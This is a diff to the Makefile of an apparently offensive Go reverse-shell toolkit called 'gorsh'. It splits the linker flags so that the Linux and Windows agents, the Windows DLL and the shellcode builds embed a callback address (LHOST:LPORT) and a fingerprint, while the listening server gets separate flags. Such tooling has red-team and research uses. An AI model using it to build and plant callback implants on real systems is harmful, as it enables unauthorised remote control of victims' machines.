@@ -68,7 +68,8 @@ ifneq ($(UNAME), Windows)
 	DLLCC=x86_64-w64-mingw32-gcc
 endif
 # embeds paramaters
-LDFLAGS = "-s -w -X main.Iface=$(INTERFACE) -X main.Host=$(LHOST) -X main.Port=$(LPORT) -X main.fingerPrint=${FINGERPRINT}"
+LDFLAGS_SERVER = "-s -w -X main.Iface=$(INTERFACE) -X main.Host=$(LHOST) -X main.Port=$(LPORT) -X main.fingerPrint=${FINGERPRINT}"
+LDFLAGS_AGENT = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
 # references the calling target within each block
 target = $(word 1, $@)
 
@@ -81,21 +82,21 @@ all: $(PLATFORMS) shellcode dll ## makes all windows, shellcode, dll, linux, dar
 linux: $(SRV_KEY) ## make the linux agent
 	GOOS=${target} ${BUILD} \
 		-buildmode pie \
-		-ldflags ${LDFLAGS} \
+		-ldflags ${LDFLAGS_AGENT} \
 		-o ${OUT}/${APP}_linux \
 		cmd/gorsh/main.go
 
 windows: $(SRV_KEY) ## make the windows agent
 	GOOS=${target} ${BUILD} \
 		-buildmode pie \
-		-ldflags ${LDFLAGS} \
+		-ldflags ${LDFLAGS_AGENT} \
 		-o ${OUT}/${APP}.exe \
 		cmd/gorsh/main.go
 
 server: $(SRV_KEY) ## make the listening server
 	${BUILD} \
 		-buildmode pie \
-		-ldflags ${LDFLAGS} \
+		-ldflags ${LDFLAGS_SERVER} \
 		-o ${target} \
 		cmd/gorsh-server/main.go
 
@@ -110,7 +111,7 @@ dll:  ## creates a windows dll. exports are definded in `cmd/gorsh-dll/dllmain.g
 		-buildmode=c-shared \
 		-trimpath \
 		${ZSTD.windows} \
-		-ldflags ${LDFLAGS} \
+		-ldflags ${LDFLAGS_AGENT} \
 		-o ${OUT}/${APP}.windows.dll \
 		cmd/gorsh-dll/dllmain.go
 
